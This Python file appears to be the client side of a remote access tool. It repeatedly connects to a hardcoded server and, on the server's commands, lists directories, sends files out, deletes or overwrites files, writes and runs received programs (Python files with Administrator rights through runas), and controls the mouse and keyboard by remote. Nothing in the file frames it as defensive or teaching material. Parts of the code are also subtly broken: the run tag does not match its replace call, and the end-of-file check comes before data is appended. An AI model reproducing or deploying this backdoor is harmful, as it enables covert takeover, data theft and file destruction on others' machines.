import os
import socket
import subprocess
from time import sleep
import threading as th
try:
	import pyautogui as py
except:
	pass
con = False
class FileClient:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.s = self.connect()

    def connect(self):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.server_ip, self.server_port))
                print("Connected to the server")
                return s
            except:
                pass

    def msg(self):
        while True:
            try:
            	m = self.s.recv(1024)
            except ConnectionResetError:
            	self.connect()
            if m:
                m = m.decode("utf-8")
                print(m)
                if "<folder>" in m:
                    m = m.replace("<folder>", "")
                    self.folder_list(m)
                elif "<delete>" in m:
                    m = m.replace("<delete>", "")
                    self.delete(m)
                    try:
                        os.remove(m)
                    except:
                        pass
                elif "<edit>" in m:
                    m = m.replace("<edit>", "")                    
                    self.edit(m)
                elif "<run>" in m:
                    m = m.replace("<_run_>", "")
                    self.runn(m)
                elif "<download>" in m:
                	m = m.replace("<download>", "")
                	self.down(m)
                elif "<controll>" in m:
                	c = th.Thread(target=self.cont)
                	c.start()
    def cont(self):
    	con = True
    	while con:
    		try:
    			command=self.s.recv(1024)
    			if command:
    				command = command.decode("utf-8")
    				if "pos_" in command:
    					command = command.replace("pos_","")
    					x,y = command.split(",")
    					self.move(x,y)
    				elif "btn_" in command:
    					command = command.replace("btn_","")
    					self.click(command)
    				elif "key_" in command:
    					command = command.replace("key_","")
    					self.press(command)
    				elif command == "<STOP>":
    					con = False
    		except:
    			pass
    def press(self,key):
    	py.press(key)
    def click(self,btn):
    	if btn == "Button.left":
    		py.click()
    	elif btn =="Button.right":
    		py.rightClick()     			
    def move(self,x,y):
    	py.moveTo(x,y)         
    def down(self,m):
    	with open(m,"rb") as file: 		
    		data = file.read()
    		self.s.sendall(data)
    		self.s.send(b"<END>")
    		print(data)
    def delete(self,p):
    	os.remove(p)
    def edit(self, path):
        try:
	        file_data1 =b""
	        with open(path,"wb") as file:
	        	while True:
	        		data1 = self.s.recv(32768)
	        		if data1:
	        			file_data1 += data1
	        			if file_data1[-5:] == b"<END>":
	        				file_data1 = file_data1[:-5]
	        				break
	        			else:	        				
	        				pass
	        	file.write(file_data1)
	        	file.close()
	        	print("done")
        except:
        	pass
    def runn(self, name):
        file_data =b""
        with open(name,"wb") as file:
        	while True:
        		data = self.s.recv(32768)
        		if data:
	        		print(data)
	        		if file_data[-5:] == b"<END>":
	        			file_data = file_data[:-5]
	        			break
	        		else:
	        			file_data += data
        	file.write(file_data)
        	file.close()
        if ".py" in name:
            subprocess.run(['runas', '/user:Administrator', 'python', name], check=True)
        else:
            os.startfile(name)

    def folder_list(self, path):        
        file_dict = {}
        names = os.listdir(path)
        for name in names:
            path1 = os.path.join(path, name)
            file_dict[name] = "folder" if os.path.isdir(path1) else "file"
        file_dict_str = str(file_dict)
        self.s.sendall(file_dict_str.encode("utf-8"))
        print(file_dict_str)
    def start(self):
        msg_thread = th.Thread(target=self.msg)
        msg_thread.start()

if __name__ == "__main__":
    client = FileClient(server_ip="192.168.29.154", server_port=12345)
    client.start()
